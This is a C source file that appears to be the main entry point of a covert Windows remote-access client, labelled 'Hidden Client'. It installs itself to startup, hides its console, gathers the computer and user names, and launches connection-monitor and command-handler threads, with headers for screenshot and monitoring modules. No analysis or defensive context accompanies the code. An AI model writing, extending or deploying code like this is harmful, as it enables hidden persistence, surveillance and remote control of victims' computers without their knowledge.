#include "common.h"
#include "config.h"
#include "utils.h"
#include "connection.h"
#include "commands.h"
#include "monitor.h"
#include "screenshot.h"
#include <stdio.h>
#include <time.h>

SOCKET client_socket = INVALID_SOCKET;
char computer_name[MAX_COMPUTERNAME_LENGTH + 1] = {0};
char user_name[256] = {0};
volatile BOOL bShouldExit = FALSE;
volatile BOOL bConnected = FALSE;

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    if (!IsInStartup())
    {
        AddToStartup();
    }

    HideConsoleWindow();
    GetComputerInfo();

    if (!InitializeWinsock())
    {
        return 1;
    }

    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "HiddenClientClass";

    if (!RegisterClass(&wc))
    {
        WSACleanup();
        return 1;
    }

    HWND hwnd = CreateWindowEx(0, "HiddenClientClass", "Hidden Client", 0, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
    if (!hwnd)
    {
        WSACleanup();
        return 1;
    }

    HANDLE hConnThread = CreateThread(NULL, 0, ConnectionMonitorThread, NULL, 0, NULL);
    HANDLE hCmdThread = CreateThread(NULL, 0, CommandHandlerThread, NULL, 0, NULL);

    MSG msg;
    time_t last_info_sent = 0;
    time_t last_screenshot_sent = 0;

    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);

        time_t now;
        time(&now);
    }

    bShouldExit = TRUE;
    WaitForSingleObject(hConnThread, INFINITE);
    WaitForSingleObject(hCmdThread, INFINITE);
    CloseHandle(hConnThread);
    CloseHandle(hCmdThread);

    if (client_socket != INVALID_SOCKET)
    {
        closesocket(client_socket);
    }
    WSACleanup();

    return 0;
}